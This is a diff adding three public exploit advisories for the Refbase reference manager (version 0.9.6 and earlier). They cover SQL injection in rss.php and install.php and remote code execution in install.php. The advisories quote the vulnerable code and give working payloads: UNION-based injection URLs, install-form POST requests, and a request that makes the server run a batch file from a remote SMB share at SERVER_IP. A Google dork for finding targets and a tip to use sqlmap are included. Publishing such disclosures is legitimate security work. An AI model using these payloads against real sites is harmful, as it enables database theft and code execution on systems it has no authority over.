@@ -1,0 +1,114 @@
+# Exploit Title: Refbase <= 0.9.6 rss.php where parameter SQL Injection
+# Google Dork: "powered by refbase"
+# Date: 23 Sep 2015
+# Exploit Author: Mohab Ali
+# @0xAli
+# Vendor Homepage: http://www.refbase.net/index.php/Web_Reference_Database
+# Software Link: http://sourceforge.net/projects/refbase/
+# Reference: https://www.kb.cert.org/vuls/id/374092
+# Version: 0.8, 0.9, 0.9.5, 0.9.6
+# Tested on: WAMP (Windows)
+# CVE : CVE-2015-6009
+# Solution: Vulnerability hasn't been patched yet.
+
+**Summary **
+Refbase v 0.9.6 and earlier versions have an SQL injection vulnerability because of the insufficient validation when passing user supplied input to be passed to the database.
+
+
+** Vulnerable code **
+################################################################################
+#Line 35 : $queryWhereClause = $_REQUEST['where'];
+#Line 86 : $sanitizedWhereClause = extractWHEREclause(" WHERE " . $queryWhereClause);
+#Line 100: $sqlQuery .= " FROM $tableRefs WHERE " . $sanitizedWhereClause;
+#Line 123: $result = queryMySQLDatabase($query);
+################################################################################
+
+** Exploit POCs **
+/rss.php?where=1+and+5=(substr(@@version,1,1))-- -If it’s true then the mysql version is > 5
+/rss.php?where='nonexistent'+union+all(select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,concat('version:',@@version,''),34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50)-- -
+/rss.php?where='nonexistent'+union+all(select+1,@@version,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41)-- -
+
+
+[!] Version 0.8 and 0.9 provide no validation, but versions 0.9.5 and 0.9.6 provide some filtering so you better let sqlmap handle it.
+[!] The GET parameter "where" is vulnerable to SQL injection despite being filtered by a custom function called extractWHEREclause() it’s still can be bypassed to inject other queries.
+The extractWHEREclause() function which is defined in include.inc.php and it removes any additional MySQL keywords.
+preg_replace("/^.*? WHERE (.+?)(?= ORDER BY| LIMIT| GROUP BY| HAVING| PROCEDURE| FOR UPDATE| LOCK IN|[ ;]+(SELECT|INSERT|UPDATE|DELETE|CREATE|ALTER|DROP|FILE)\b|$).*?$/i", "\\1", $query);
+But it can be bypassed.
+
+
+# Contacted vendor: 23 Dec 2014
+# Public disclosure: 23 Sep 2015 		
+
+################################################################################
+
+# Exploit Title: Refbase <= 0.9.6 install.php defaultCharacterSet parameter SQL Injection
+# Google Dork: "powered by refbase"
+# Public Disclosure Date: 21 Sep 2015
+# Exploit Author: Mohab Ali
+# @0xAli
+# Vendor Homepage: http://www.refbase.net/index.php/Web_Reference_Database
+# Software Link: http://sourceforge.net/projects/refbase/
+# Reference: https://www.kb.cert.org/vuls/id/374092
+# Version: 0.8, 0.9, 0.9.5, 0.9.6.
+# Tested on: WAMP (Windows)
+# CVE : CVE-2015-6009
+# Solution: Remove the install.php file after the installation
+
+**Summary **
+Refbase v 0.9.6 and earlier versions have an SQL injection vulnerability because of the insufficient validation when passing user supplied input to be passed to the database.
+
+[!] You have to know the correct MySQL credentials.
+
+** Vulnerable code **
+################################################################################
+#Line 77 :  $defaultCharacterSet = $_POST['defaultCharacterSet'];
+#Line 407: $queryCreateDB = $queryCreateDB . " DEFAULT CHARACTER SET " . $defaultCharacterSet;
+#Line 424: if (!($result = @ mysql_query ($queryCreateDB, $connection)))
+################################################################################
+
+** Exploit POC **
+
+Request:
+POST /install.php
+formType=install&submit=Install&adminUserName=root&adminPassword=pass&pathToMYSQL=C:\mysql5.6.17\bin\mysql.exe&databaseStructureFile=./install.sql&pathToBibutils=&defaultCharacterSet=SQL QUERY HERE&submit=Install
+
+################################################################################
+
+# Exploit Title: Refbase <= 0.9.6 install.php pathToMYSQL parameter RCE (Windows)
+# Google Dork: "powered by refbase"
+# Public Disclosure Date: 21 Sep 2015
+# Exploit Author: Mohab Ali
+# @0xAli
+# Vendor Homepage: http://www.refbase.net/index.php/Web_Reference_Database
+# Software Link: http://sourceforge.net/projects/refbase/
+# Reference: https://www.kb.cert.org/vuls/id/374092
+# Version: 0.9.6 and earlier. 0.6.1 and prior versions are not vulnerable.
+# Tested on: Windows
+# CVE : CVE-2015-6008
+# Solution: Remove the install.php file after the installation
+
+**Summary **
+Refbase v 0.9.6 and earlier versions have an RCE vulnerability because of the insufficient validation when passing user supplied input to be executed by the system.
+
+[!] You have to know the correct MySQL credentials and this doesn't appear to be exploitable on Linux since (AFAIK) it can't execute scripts remote smb shares by default.
+
+
+** Vulnerable code **
+################################################################################
+#Line 62: $pathToMYSQL = $_POST['pathToMYSQL'];
+#Line 67: $databaseStructureFile = $_POST['databaseStructureFile'];
+#Line 429: exec($pathToMYSQL . " -h " . $hostName . " -u " . $adminUserName . " -p" .$adminPassword . " --database=" . $databaseName . " < " . $databaseStructureFile . " 2>&1", $resultArray);
+################################################################################
+
+[*] pathToMYSQL and databaseStructureFile can't be empty, and has to be real file. And they can't contain ';' or '|'
+[*] To exploit this in Windows you can provide an executable on a remote share and execute it.
+
+** Exploit POC **
+
+Request:
+formType=install&submit=Install&adminUserName=root&adminPassword=123&pathToMYSQL=%5C%5CSERVER_IP%5CShare%5Cexec.bat&databaseStructureFile=.%2Finstall.sql&pathToBibutils=&defaultCharacterSet=latin1&submit=Install
+
+Executed command:
+\\SERVER_IP\Share\exec.bat -h localhost -u root -p123 --database=literature < ./install.sql 2>&1
+
+
